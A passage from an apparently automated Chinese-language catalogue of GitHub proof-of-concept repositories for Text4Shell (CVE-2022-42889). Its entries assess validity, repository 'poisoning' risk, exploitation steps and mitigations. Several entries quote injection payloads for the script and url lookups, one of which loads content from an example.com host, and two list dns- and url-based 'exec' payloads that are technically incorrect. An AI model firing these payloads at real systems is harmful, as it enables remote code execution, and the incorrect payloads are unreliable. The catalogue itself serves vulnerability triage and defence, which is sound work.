CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个高危漏洞。该漏洞源于程序在处理用户提供的字符串时，使用了不安全的变量插值功能。攻击者可以通过构造包含恶意表达式的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`，利用`script`、`dns`或`url`等lookup前缀，执行任意代码。 

**有效性：**

根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞是有效的。漏洞利用代码中的Dockerfile-vuln和README.md文件清晰地展示了如何构建一个包含漏洞的应用程序，并使用特定的payload触发远程代码执行，例如创建`/tmp/foo`文件。

**投毒风险：**

该仓库的投毒风险较低，约为5%。 虽然不能完全排除作者隐藏恶意代码的可能性，但是从以下几点可以分析出，投毒的概率较低:

*   提供的代码主要是漏洞的演示和利用，重点在于复现漏洞本身。
*   Dockerfiles主要用于环境搭建，没有发现可疑的恶意命令。
*   pom-patched.xml修复了漏洞，pom-vuln.xml 包含漏洞，本身是用来复现漏洞的。
*   README.md 详细描述了利用步骤和验证方式，方便用户理解和测试。
*   azure-pipelines.yml 使用Sysdig进行安全扫描，表明作者可能关注安全性问题。

**可能的投毒方式（仅为假设）**:

*   在`src`目录下的Java代码中加入后门。
*   修改`pom.xml`，引入恶意的依赖项。
*   在Dockerfile中添加执行恶意命令的指令。

**利用方式：**

1.  应用程序使用Apache Commons Text 1.5到1.9之间的版本。
2.  应用程序允许用户提供字符串，这些字符串将被用于变量插值。
3.  攻击者构造包含恶意表达式的字符串，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，其中 `command` 是攻击者想要执行的系统命令。
4.  应用程序解析并执行该字符串，导致远程代码执行。

**缓解措施：**

1.  升级到Apache Commons Text 1.10.0或更高版本，该版本默认禁用了存在风险的interpolator。
2.  如果无法升级，禁用或限制应用程序中使用的lookup，移除`script`、`dns`和`url`等lookup的默认配置。
3.  对用户提供的输入进行严格的验证和过滤，防止恶意表达式的注入。

**项目地址:** [aaronm-sysdig/text4shell-docker](https://github.com/aaronm-sysdig/text4shell-docker)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #12

**来源**: [CVE-2022-42889-adarshpv9746_Text4shell--Automated-exploit---CVE-2022-42889.md](../2022/CVE-2022-42889-adarshpv9746_Text4shell--Automated-exploit---CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.10.0 (1.5-1.9)

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并且允许用户可控的输入传递给文本插值函数

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889（又名Text4Shell）是Apache Commons Text库中的一个漏洞，它允许攻击者通过变量插值执行任意代码。该漏洞存在于1.5到1.9版本中。漏洞利用方式是，攻击者可以向应用程序提供包含恶意表达式的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。当应用程序使用Commons Text处理此输入时，该表达式将被解析和执行，从而导致远程代码执行。

**有效性评估：**
提供的POC代码似乎有效，因为它演示了如何使用`script`前缀执行任意命令。 Dockerfile 和 README.md 文件描述了如何构建和运行一个易受攻击的应用程序，`exploit.php` 文件构造了利用此漏洞的有效载荷。从搜索结果来看，该漏洞是一个高危漏洞，已经被广泛研究和利用。

**投毒风险分析：**
该仓库中存在潜在的投毒风险，但概率较低。以下是一些需要考虑的因素：

*   `install.sh` 和 `stop-app.sh` 脚本包含一些危险的命令，例如 `sudo` 命令以及`docker kill $(sudo docker ps -q)`。虽然这是为了快速启动和停止 docker 环境，但是也可能会被恶意使用，例如，如果攻击者控制了这些脚本，他们可以利用 `sudo` 命令来执行恶意操作。
*   `exploit.php` 文件中的 `$ip = "172.17.0.1";` 可能是一个陷阱。如果攻击者直接使用这段代码，他们的反向shell可能无法连接，从而暴露出攻击者。

考虑到作者的意图是演示漏洞利用，而并非恶意攻击，将此代码判定为投毒代码的概率为10%。

**利用方式：**
1.  构建和运行易受攻击的应用程序。
2.  构造包含恶意表达式的输入，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。
3.  将此输入传递给应用程序的文本插值函数。
4.  表达式将被解析和执行，从而导致远程代码执行。`exploit.sh`和`exploit.php` 文件提供了一种自动化的利用方式，利用`nc`进行反弹shell。

**项目地址:** [adarshpv9746/Text4shell--Automated-exploit---CVE-2022-42889](https://github.com/adarshpv9746/Text4shell--Automated-exploit---CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #13

**来源**: [CVE-2022-42889-chainguard-dev_text4shell-policy.md](../2022/CVE-2022-42889-chainguard-dev_text4shell-policy.md)

## CVE-2022-42889 Apache Commons Text Text4Shell RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经授权的攻击者执行任意代码

**影响版本:** <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text 且允许用户控制的输入传递给插值功能。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个漏洞，该漏洞允许攻击者通过变量插值执行任意代码。当应用程序使用受影响版本（1.5 到 1.9）的库，并且允许不可信的输入传递给执行插值的函数时，就存在风险。 

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且危害等级高，可以远程执行代码。提供的 Dockerfile 展示了如何使用包含漏洞的 commons-text-1.0.0-SNAPSHOT.jar 包构建镜像，并通过 java -jar 命令运行，这意味着该 POC 能够重现漏洞，证明其有效性。

**投毒风险分析：**

提供的代码包括一个 Dockerfile 和一个 LICENSE 文件。Dockerfile 用于构建一个包含易受攻击的Apache Commons Text库的Java应用程序镜像。LICENSE文件是标准的Apache 2.0许可协议，本身不包含恶意代码。由于Dockerfile只是部署了漏洞利用所需的易受攻击的jar包，并没有其他可疑操作，因此该仓库直接包含投毒代码的可能性较低，但存在一定的供应链风险，即如果依赖的jar包本身就被投毒，那么部署的应用也就会被投毒。综合判断，投毒的可能性评估为5%。

**利用方式：**

该漏洞的利用方式是构造包含恶意表达式的字符串，利用 Apache Commons Text 的字符串插值功能执行任意代码。具体步骤如下：

1.  确定应用程序中使用了 Apache Commons Text 库，并且版本在 1.5 到 1.9 之间。
2.  找到应用程序中允许用户控制的输入点，该输入会被传递给 Apache Commons Text 的字符串插值功能。
3.  构造包含恶意表达式的输入字符串，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('evil command')}`。其中，`script` 前缀指示使用 javax.script 引擎执行代码。其他的利用方式还包括使用 `dns` 和 `url` 前缀。
4.  将构造的恶意字符串发送给应用程序。
5.  应用程序使用 Apache Commons Text 进行字符串插值时，会执行恶意表达式，从而导致远程代码执行。

**修复建议：**

升级到 Apache Commons Text 1.10.0 或更高版本。该版本默认禁用了有风险的插值器。

**项目地址:** [chainguard-dev/text4shell-policy](https://github.com/chainguard-dev/text4shell-policy)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #14

**来源**: [CVE-2022-42889-cryxnet_CVE-2022-42889-RCE.md](../2022/CVE-2022-42889-cryxnet_CVE-2022-42889-RCE.md)

## CVE-2022-42889-Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** 1.5 - 1.9

**利用条件:** 需要应用程序使用Apache Commons Text 1.5-1.9版本,并且允许从不受信任的源接收和处理字符串输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中存在不安全的变量插值功能。攻击者可以通过构造包含恶意表达式的字符串，利用`${prefix:name}`格式进行插值，其中 `prefix` 指定了 `StringLookup` 的实例，而 `name` 包含了要执行的命令或表达式。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且影响Apache Commons Text 1.5到1.9版本。POC代码的`README.md`文件描述了漏洞原理和利用方式，`main.py`文件包含了利用漏洞的代码示例。利用脚本中使用了`script`、`url` 和 `dns` 等前缀，这些前缀在受影响的版本中默认启用，可导致任意代码执行。

**投毒风险：**
该POC代码主要目标是利用漏洞，但存在一定的投毒风险。风险评估在10%。主要原因分析如下：

*   **代码混淆/隐藏：** 虽然没有明显的混淆，但是代码的可读性不是非常高，存在一些压缩和简化写法，这可能用来隐藏恶意代码。
*   **恶意依赖：** 脚本中使用了`os`, `requests`, `colorama`, `base64`, `nmap`库。这些库本身没有问题，但存在被滥用的可能. 比如`os.system` 或 `subprocess.call` 执行恶意命令.
*   **Payload生成：** 脚本中定义了`payloads`字典，其中包含一些 RCE Payload。攻击者可能会修改这些payload执行恶意指令。
*   **网络行为：** 脚本使用`requests`库，可能用于下载恶意payload或者回传信息。`nmap` 也可能被滥用。
*   **powershellRevshell：** 脚本包含了一个powershell reverse shell 脚本，需要LHOST和LPORT，可能被用于植入后门。

**利用方式：**
利用方式如下：
1.  **漏洞定位：** 找到使用存在漏洞的 Apache Commons Text 库，且允许用户可控输入的地方。
2.  **构造Payload：** 构造包含恶意表达式的字符串，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('COMMAND')}`。将 'COMMAND' 替换为要执行的命令。
3.  **发送Payload：** 将构造的Payload发送到目标应用程序。
4.  **执行代码：** 如果应用程序使用存在漏洞的Commons Text库处理了Payload，那么恶意命令将被执行。

**总结：**
该漏洞利用的有效性较高，因为可以通过多种方式执行任意命令。虽然提供的POC主要是为了验证漏洞，但是如果被恶意修改，仍然存在投毒的可能。使用该POC时需要注意安全风险，并对其代码进行详细审查。

**项目地址:** [cryxnet/CVE-2022-42889-RCE](https://github.com/cryxnet/CVE-2022-42889-RCE)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #15

**来源**: [CVE-2022-42889-cxzero_CVE-2022-42889-text4shell.md](../2022/CVE-2022-42889-cxzero_CVE-2022-42889-text4shell.md)

## CVE-2022-42889 - Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 1.5 <= 版本 <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，并且允许用户控制的输入传递给 StringSubstitutor.replace() 或 StringSubstitutor.replaceIn() 方法进行插值。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，也被称为 Text4Shell，是一个存在于 Apache Commons Text 库中的高危漏洞。该漏洞源于库中 StringSubstitutor 类的变量插值功能。如果应用程序使用受影响版本（1.5 到 1.9）的 Apache Commons Text，并且允许用户控制的输入用于字符串插值，那么攻击者可以通过构造恶意输入来执行任意代码。

**利用方式：**

攻击者可以利用 `${prefix:name}` 格式的字符串，其中 `prefix` 指定了用于查找 `StringLookup` 实例的前缀。漏洞存在于以下几个 lookup 中：

*   **script:** 允许使用 JVM 脚本执行引擎（javax.script）执行表达式。例如，在 JDK 15 之前，可以使用 Nashorn 引擎执行 JavaScript 代码，从而执行任意命令：`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`。在 JDK 15 及更高版本中，如果应用程序包含 JEXL 等第三方依赖，仍然可能通过类似方式执行代码。
*   **dns:** 允许解析 DNS 记录。虽然不能直接执行代码，但可以用于信息收集或发起拒绝服务攻击：`${dns:address|commons.apache.org}`。
*   **url:** 允许从指定的 URL 加载值，包括远程服务器。这可以用来读取敏感信息或通过 SSRF 发起攻击：`${url:UTF-8:https://nvd.nist.gov/vuln/detail/CVE-2022-42889}`。

**POC 分析：**

提供的 Dockerfile 和 README 文件提供了一个可用于测试和验证此漏洞的 POC 环境。Dockerfile 设置了所需的 Java 环境，并编译和运行包含漏洞的应用程序。README 提供了不同利用方式的示例，包括使用 `script`、`dns` 和 `url` lookup 的 payload。

**投毒风险分析：**

根据提供的文件内容，该仓库的主要目的是为了重现和演示 CVE-2022-42889 漏洞。评估投毒风险较低。Dockerfile虽然安装了一些如netcat，wget，curl等工具，可以辅助漏洞验证。但根据POC利用的常规方式，以及参考互联网上已公开的POC和EXP来看，这些工具都是常规操作。

**总结：**

CVE-2022-42889 是一个严重的安全漏洞，允许攻击者远程执行代码。应用程序应尽快升级到 Apache Commons Text 1.10.0 或更高版本，以禁用有问题的 interpolator，并仔细审查代码，确保用户提供的输入不会用于字符串插值。提供的 POC 代码对于理解和验证漏洞非常有用，但应谨慎使用，并采取适当的安全措施。

**项目地址:** [cxzero/CVE-2022-42889-text4shell](https://github.com/cxzero/CVE-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #16

**来源**: [CVE-2022-42889-devenes_text4shell-cve-2022-42889.md](../2022/CVE-2022-42889-devenes_text4shell-cve-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的Apache Commons Text，且允许用户可控的输入传递给使用了不安全插值默认值的文本处理函数。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞存在于Apache Commons Text 1.5到1.9版本中，由于默认启用的StringLookup实例存在安全问题，允许攻击者在应用程序处理用户提供的字符串时执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。漏洞利用代码（Dockerfile、README.md、pom.xml）提供了一个可运行的示例，展示了如何利用该漏洞执行任意命令。

**投毒风险：**

该POC代码的主要目的是演示CVE-2022-42889漏洞的利用。Dockerfile构建了一个包含漏洞的Java应用程序，README.md提供了运行和测试该应用程序的说明，pom.xml则定义了Maven项目的依赖和构建配置。尽管POC代码本身是为了演示漏洞，潜在的投毒风险极低（约1%）。

**利用方式：**

1.  **漏洞原理：** Apache Commons Text 存在变量插值功能，允许动态评估和扩展属性。受影响版本中，默认启用的 `script`、`dns` 和 `url` 等 StringLookup 实例允许执行任意代码、解析 DNS 记录或加载 URL。如果应用程序允许用户控制输入，则可能遭受远程代码执行攻击。
2.  **攻击步骤：**
    a.  部署包含漏洞的应用程序。
    b.  向应用程序发送包含恶意payload的请求。Payload利用 `${prefix:name}` 格式，其中 `prefix` 是 `script`、`dns` 或 `url`，`name` 包含要执行的恶意代码。
    c.  服务器处理请求，执行payload，导致远程代码执行。
3.  **示例payload：**
    `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`

此payload使用 `script` 前缀执行 JavaScript 代码，调用 `java.lang.Runtime.getRuntime().exec()` 执行 `touch /tmp/foo` 命令，在目标服务器上创建 `/tmp/foo` 文件。

**缓解措施：**

*   升级到 Apache Commons Text 1.10.0 或更高版本，该版本默认禁用有问题的插值器。
*   禁用或限制应用程序中使用的不安全 StringLookup 实例。
*   对用户提供的输入进行严格的验证和清理，以防止恶意payload注入。

**项目地址:** [devenes/text4shell-cve-2022-42889](https://github.com/devenes/text4shell-cve-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #17

**来源**: [CVE-2022-42889-f0ng_text4shellburpscanner.md](../2022/CVE-2022-42889-f0ng_text4shellburpscanner.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，且允许用户控制的输入传递给`StringSubstitutor.replace()`方法。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-42889 (Text4Shell) 漏洞存在于 Apache Commons Text 1.5 到 1.9 版本。该漏洞源于库中不安全的插值默认设置，当应用程序使用这些默认设置且允许用户控制输入时，攻击者可以利用 `${prefix:name}` 格式的字符串，其中 `prefix` 指示要使用的 `StringLookup` 实例。受影响的版本默认包含 `script`、`dns` 和 `url` 这几个 lookup，利用 `script` 可以执行任意 JVM 脚本，利用 `dns` 可以解析 DNS 记录，利用 `url` 可以从远程服务器加载值。攻击者可以构造恶意输入，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，来执行任意命令。提供的漏洞利用代码是一个 Burp Suite 插件，用于检测是否存在此漏洞，它并没有直接执行恶意代码，只是辅助进行漏洞验证。从代码本身来看，没有明显的恶意行为，但考虑到Burp插件的功能强大，理论上作者可以暗中收集用户的使用数据或者篡改请求包，但这种可能性较低，约1%。

**利用方式：**

1.  **确定目标应用程序是否使用了受影响版本的 Apache Commons Text。**
2.  **确定应用程序是否允许用户控制的输入传递给 `StringSubstitutor.replace()` 方法。**
3.  **构造包含恶意插值表达式的输入。** 例如,`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。
4.  **将恶意输入发送到目标应用程序。**
5.  **如果应用程序存在漏洞，则恶意命令将在服务器上执行。**

**缓解措施：**

*   升级到 Apache Commons Text 1.10.0 或更高版本，该版本默认禁用有问题的插值器。
*   如果无法升级，则可以禁用应用程序中的 `script`、`dns` 和 `url` 插值器。

**项目地址:** [f0ng/text4shellburpscanner](https://github.com/f0ng/text4shellburpscanner)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #18

**来源**: [CVE-2022-42889-gokul-ramesh_text4shell-exploit.md](../2022/CVE-2022-42889-gokul-ramesh_text4shell-exploit.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未授权的攻击者执行任意代码

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text, 并且允许变量插值处理不受信任的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为Text4Shell，是一个存在于Apache Commons Text库中的高危漏洞。该漏洞源于库中不安全的变量插值默认设置。攻击者可以通过构造包含恶意表达式的输入，利用`${prefix:name}`格式进行插值，触发远程代码执行。

**有效性：** 根据漏洞库信息和搜索结果，该漏洞利用是有效的，并且影响Apache Commons Text 1.5到1.9版本。提供的POC代码尝试利用`script`, `url` 和 `dns` 等 lookup 实现远程代码执行。

**投毒风险：**
*   POC代码本身的主要目的是为了验证漏洞的存在，利用interactsh来验证命令执行。投毒风险评估较低，约为10%。
*   投毒风险主要来自以下方面：虽然POC主要目的是进行漏洞验证，但如果使用者不小心，直接在生产环境运行，可能会造成破坏。此外，攻击者可能修改POC代码，添加恶意功能，例如植入后门，并传播修改后的POC。
*   代码中使用了 `ping` 命令进行验证，这本身没有危害，但恶意修改者可能替换成更危险的命令。

**利用方式：**
1.  **漏洞定位：** 确定目标应用程序使用了Apache Commons Text 1.5到1.9的受影响版本。
2.  **构造Payload：** 构造包含恶意表达式的输入字符串，利用`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`, `${url:UTF-8:java.lang.Runtime.getRuntime().exec('command')}` 或者 `${dns:address:java.lang.Runtime.getRuntime().exec('command')}` 这样的格式。
3.  **发送Payload：** 将构造的Payload作为输入发送到目标应用程序，例如通过HTTP请求的查询参数或User-Agent头。
4.  **执行代码：** 如果应用程序使用Commons Text对Payload进行变量插值，恶意代码将被执行。
5.  **验证：** 使用interactsh等工具验证代码是否成功执行。例如, 通过DNS请求或者ping命令。

**缓解措施：**
*   升级到Apache Commons Text 1.10.0或更高版本，该版本默认禁用了有问题的插值器。
*   如果无法升级，可以配置`StringLookupFactory`以禁用`script`、`dns`和`url`查找。
*   对所有用户输入进行严格的验证和清理，避免将不受信任的数据传递给Commons Text进行处理。

**项目地址:** [gokul-ramesh/text4shell-exploit](https://github.com/gokul-ramesh/text4shell-exploit)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #19

**来源**: [CVE-2022-42889-hotblac_text4shell.md](../2022/CVE-2022-42889-hotblac_text4shell.md)

## CVE-2022-42889 - Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** <= 1.9

**利用条件:** 应用程序必须使用受影响版本的Apache Commons Text，并且允许用户控制的输入传递给StringSubstitutor进行插值。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889 (Text4Shell) 是 Apache Commons Text 库中的一个漏洞，允许攻击者通过操纵传递给 `StringSubstitutor` 的输入来执行任意代码。漏洞存在于1.5到1.9版本中。升级到1.10.0及以上版本可以解决此问题，因为该版本默认禁用了有问题的插值器，或者禁用受影响的lookup，例如`script`, `dns`, `url`。

**有效性：**
根据漏洞描述和搜索结果，提供的POC代码（尤其是 `src/main/java/org/dontpanic/text4shell/controller/ExploitMeController.java` 文件）旨在演示此漏洞。`ExploitMeController` 中的 `/lookup` 端点接收用户提供的 `value`，并将其直接传递给 `StringSubstitutor.replace()` 方法，而没有进行任何清理或验证。这允许攻击者注入恶意表达式，例如`${script:javascript:Runtime.getRuntime().exec("command")}`，从而导致远程代码执行。

**投毒风险：**
提供的代码主要是漏洞利用的演示，旨在重现和展示 CVE-2022-42889。虽然代码本身并没有明显的恶意或后门性质，但存在一些小的风险。由于整个仓库的目的就是为了演示漏洞，如果有人下载并部署了这个应用，并将其暴露在公网上，那么它会立即成为攻击目标。因此，可以认为存在很低的投毒风险 (约5%)，因为作者可能故意提供一个容易被利用的环境，但不是传统意义上的“投毒”，而是漏洞演示的副产品。

**利用方式：**
1.  **目标系统：** 目标系统需要运行使用了 Apache Commons Text 1.5 到 1.9 版本的应用程序。
2.  **输入注入：** 攻击者需要找到一个应用程序接口，该接口允许用户提供输入，然后应用程序使用受影响的 Apache Commons Text 版本对该输入进行插值处理。例如，在提供的 POC 中，`/lookup` 端点就是一个这样的接口。
3.  **构造恶意Payload：**  攻击者需要构造一个包含恶意表达式的Payload，该表达式利用了 `script`, `dns`, 或 `url` lookup 来执行代码或进行其他恶意操作。示例Payload：
    *   `${script:javascript:Runtime.getRuntime().exec('touch /tmp/pwned')}` - 执行任意命令 (例如，创建一个文件)。
    *   `${dns:address|example.com}` - 执行 DNS 查询。
    *   `${url:UTF-8:https://example.com/evil.txt}` - 从远程 URL 加载内容。
4.  **发送Payload：**  攻击者将构造的Payload发送到目标应用程序的易受攻击的接口。
5.  **代码执行：**  如果应用程序使用 `StringSubstitutor` 处理Payload，它将执行Payload中的恶意表达式，从而导致远程代码执行或其它恶意行为。


**项目地址:** [hotblac/text4shell](https://github.com/hotblac/text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #20

**来源**: [CVE-2022-42889-joshbnewton31080_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-joshbnewton31080_cve-2022-42889-text4shell.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许远程代码执行

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，并且允许用户控制的输入传递给StringSubstitutor.replace()方法

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中使用的字符串插值功能，攻击者可以通过构造包含恶意脚本的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`，来执行任意代码。提供的POC代码通过创建一个简单的Spring Boot应用程序，演示了如何利用该漏洞。`HelloController.java`文件中的`attack`方法使用`StringSubstitutor.createInterpolator()`创建插值器，并使用`interpolator.replace(search)`来替换用户提供的输入。如果应用程序使用Commons Text 1.5到1.9版本，并且允许用户控制的输入传递给`replace()`方法，则攻击者可以利用此漏洞执行任意代码。

**有效性：**

根据提供的漏洞库信息、搜索引擎结果和POC代码，可以判断该漏洞利用是有效的。POC代码展示了利用`script`前缀执行`touch`命令的例子。搜索引擎结果也确认了该漏洞的存在以及利用方式。

**投毒风险：**

审查提供的文件，Dockerfile文件用于构建Docker镜像，pom.xml是Maven的配置文件，用于管理项目依赖和构建过程，src/main/java包含了应用程序的源代码，src/test/java 包含了测试代码。这些文件本身不包含明显的恶意代码，因此可以判断投毒风险较低。pom.xml 中指定的 commons-text 版本是1.8， 属于漏洞版本。 Dockerfile文件也没问题。

**利用方式：**

1.  应用程序使用Apache Commons Text 1.5到1.9版本。
2.  应用程序允许用户控制的输入传递给`StringSubstitutor.replace()`方法。
3.  攻击者构造包含恶意脚本的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，其中`command`是要执行的任意命令。
4.  应用程序使用`StringSubstitutor.replace()`方法替换输入，触发漏洞，执行恶意代码。

**项目地址:** [joshbnewton31080/cve-2022-42889-text4shell](https://github.com/joshbnewton31080/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #21

**来源**: [CVE-2022-42889-kljunowsky_CVE-2022-42889-text4shell.md](../2022/CVE-2022-42889-kljunowsky_CVE-2022-42889-text4shell.md)

## CVE-2022-42889 - Apache Commons Text 远程代码执行

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令。

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，且允许用户可控的字符串传递给`StringSubstitutor`进行插值。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为“Text4Shell”，是一个存在于Apache Commons Text库中的高危漏洞。该漏洞源于程序在处理用户提供的输入时，使用了不安全的默认插值器，允许攻击者利用`script`、`dns`和`url`等前缀执行任意代码或与远程服务器通信。

**有效性分析：**

提供的PoC代码看起来是有效的。它通过生成包含恶意payload的URL，来触发远程代码执行。payload利用了`script`、`url`、`dns`等lookup来执行命令。

**投毒风险分析：**

PoC代码存在轻微的投毒风险。主要风险点在于：

1.  **Payload下载地址：** 代码首先从`https://gist.githubusercontent.com/kljunowsky/97479082f50cd9219e80258f698c4d26/raw/7e600767bc59483653a34f17bd426340f28bf086/text4shell-payloads.txt` 下载payloads，如果该地址被篡改，可能会导致执行恶意代码。当然从payloads-final.txt的命名可以看出， payload还需要经过gau命令和grep命令过滤。风险降低。
2.  **外部命令执行：** 代码使用了`os.system` 来执行`wget`, `gau`, `qsreplace`, `ffuf` 命令。如果这些命令本身存在漏洞或者被替换为恶意程序，也可能导致攻击。
3. **Collaborator URL：** 此PoC会默认将流量导向id.burpcollaborator.com，若此域名被劫持，则存在一定的安全隐患。

综上，投毒风险约为10%。

**利用方式：**

1.  **确定目标：** 确定目标应用程序使用了受影响的Apache Commons Text版本（1.5 <= version <= 1.9），并且允许用户控制的字符串传递给`StringSubstitutor`进行插值处理。
2.  **构造Payload：** 使用`script`、`dns`或`url`等前缀构造恶意payload，例如：
    *   `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`
    *   `${url:UTF-8:java.lang.Runtime.getRuntime().exec('command')}`
    *   `${dns:address:java.lang.Runtime.getRuntime().exec('command')}`
3.  **传递Payload：** 将构造好的payload作为输入传递给目标应用程序。这可能通过URL参数、POST请求数据、或其他任何应用程序接受用户输入的地方。
4.  **触发执行：** 当应用程序使用`StringSubstitutor`对包含payload的字符串进行插值处理时，payload中的命令将被执行，从而实现远程代码执行。

**缓解措施：**

*   升级到Apache Commons Text 1.10.0或更高版本。
*   禁用或删除不安全的插值器（`script`、`dns`、`url`）。
*   对用户输入进行严格的验证和过滤。

**项目地址:** [kljunowsky/CVE-2022-42889-text4shell](https://github.com/kljunowsky/CVE-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #22

**来源**: [CVE-2022-42889-korteke_CVE-2022-42889-POC.md](../2022/CVE-2022-42889-korteke_CVE-2022-42889-POC.md)

## CVE-2022-42889-Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可导致远程代码执行，完全控制受影响系统

**影响版本:** <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并且允许处理不可信的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889 (Text4Shell) 是 Apache Commons Text 库中的一个高危漏洞。该漏洞源于程序在处理变量插值时，允许动态评估和扩展属性。在1.5到1.9版本中，默认包含的Lookup实例集中存在可能导致任意代码执行或与远程服务器通信的插值器，例如 "script" (使用JVM脚本引擎执行表达式), "dns" (解析DNS记录) 和 "url" (从URL加载值)。

**有效性：**
